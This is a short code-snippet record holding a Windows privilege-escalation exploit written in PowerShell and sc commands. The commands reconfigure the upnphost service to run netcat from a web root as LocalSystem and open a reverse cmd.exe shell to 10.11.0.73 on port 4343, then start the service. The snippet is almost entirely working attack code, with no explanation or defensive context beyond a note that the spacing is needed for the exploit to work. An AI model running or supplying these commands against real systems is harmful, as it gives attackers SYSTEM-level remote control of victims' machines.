---
id: 3d274dd2-adb2-4a76-bc2e-f6ed8465cf18
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:29.544613+00:00'
updated_at: '2023-04-10T20:37:52.276546+00:00'
---

# Code Snippet 3d274dd2

**Language**: Powershell

```powershell
# NOTE: spaces are mandatory for this exploit to work !
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```
